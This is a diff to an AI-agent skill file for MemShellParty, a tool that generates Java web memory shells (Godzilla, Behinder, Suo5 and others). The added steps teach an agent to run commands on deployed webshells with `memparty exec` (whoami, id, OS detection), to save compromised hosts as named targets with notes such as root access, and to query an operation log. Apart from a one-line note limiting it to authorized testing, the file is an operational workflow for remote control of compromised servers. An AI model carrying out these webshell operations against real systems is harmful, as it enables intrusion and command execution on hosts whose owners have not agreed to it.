@@ -1,6 +1,6 @@
 ---
 name: memshell-party
-description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), and verify deployed shells with `memparty connect`. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, or test that a Godzilla / Behinder / suo5 shell is alive — for authorized security testing, red-team engagements, or research only.
+description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), verify deployed shells with `memparty connect`, and run commands on them with `memparty exec`. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, test that a Godzilla / Behinder / suo5 shell is alive, or execute commands on a Godzilla / Behinder shell — for authorized security testing, red-team engagements, or research only.
 ---
 
 # MemShellParty skill
@@ -18,7 +18,8 @@ Two equivalent interfaces — pick whichever is available:
 - **CLI**: `memparty <command> [flags]` (install: `npm install -g memshell-party-cli`, or `npx memshell-party-cli`).
 - **MCP tools** (if the `memshell-party` MCP server is connected): `list_servers`, `list_config`,
   `list_packers`, `list_command_configs`, `generate_memshell`, `generate_probe`, `parse_classname`,
-  `server_version`, `connect_test`.
+  `server_version`, `connect_test`, `exec_command`, `target_save`, `target_note`, `target_list`,
+  `target_remove`, `log_list`.
 
 The CLI is the source of truth for examples below; MCP tool args mirror the CLI flags
 (`-s/--server` → `server`, `-t/--tool` → `shellTool`, `-y/--type` → `shellType`, `-p/--packer` → `packer`).
@@ -161,6 +162,62 @@ memparty connect -u <shell-url> -t godzilla --pass pass --key key \
 
 Over MCP the same check is the `connect_test` tool (`url`, `tool`, `pass`/`key`,
 `headerName`/`headerValue`, `suo5Mode`).
+
+## Step 5 — Execute commands on the shell
+
+Once the handshake passes, `memparty exec` runs a command on a Godzilla / Behinder shell and
+prints the remote stdout+stderr (exit 0/1). Pass the same credentials and gate header as for
+`connect`:
+
+```bash
+memparty exec -u <shell-url> -t godzilla --pass pass --key key \
+  --header-name User-Agent --header-value <headerValue-from-gen-json> \
+  --cmd "whoami"
+memparty exec -u <shell-url> -t behinder --pass rebeyond \
+  --header-name User-Agent --header-value <headerValue-from-gen-json> \
+  --cmd "id"
+```
+
+- Godzilla auto-detects the remote OS via `getBasicsInfo` (one extra request) to pick
+  `cmd.exe /c` vs `/bin/sh -c`; add `--os windows|linux` to skip the detection.
+- Behinder's `Cmd` payload detects the OS itself, so no flag is needed.
+- `--json` returns `{ ok, tool, url, command, output, durationMs }` — preferred for agents.
+
+Over MCP this is the `exec_command` tool (`url`, `tool`, `command`, `pass`/`key`, `os`,
+`headerName`/`headerValue`).
+
+## Step 6 — Save targets, switch by name
+
+Flag soup gets old fast. Save each working shell into a **project** (a named group of shells
+with an optional remark and category), then reference it as `<project>/<shell>`:
+
+```bash
+memparty target save web1/bh9060 -u <shell-url> -t behinder --pass rebeyond \
+  --header-name User-Agent --header-value <headerValue-from-gen-json> \
+  --remark "内网测试环境" --category test --shell-remark "root 权限"
+memparty target list                      # everything, or --category test
+memparty exec web1/bh9060 --cmd "whoami" # no other flags needed
+memparty exec web1 --cmd "id"            # bare project works when it holds one shell
+```
+
+MCP equivalents: `target_save` (project, shell, url, tool, creds, `projectRemark`,
+`projectCategory`, `shellRemark`), `target_list` (optional `category` filter), `target_note`
+(project meta, or a shell's remark when `shell` is given), `target_remove`; then pass
+`name: "<project>/<shell>"` to `connect_test` / `exec_command`.
+The store lives at `~/.memparty/targets.json`.
+
+## Step 7 — Audit with the operation log
+
+Every operation (gen, probe, connect, exec, target save/note/remove) is appended to
+`~/.memparty/operations.jsonl` — no credentials, no payload bytes; exec output is truncated.
+Query it to recall what was done against a target:
+
+```bash
+memparty log --category exec --target web1
+```
+
+Over MCP this is the `log_list` tool (`category`, `target`, `limit`). Use it to review past
+actions before repeating them, or to answer "what did we run on this host?".
 
 ## Gotchas
 
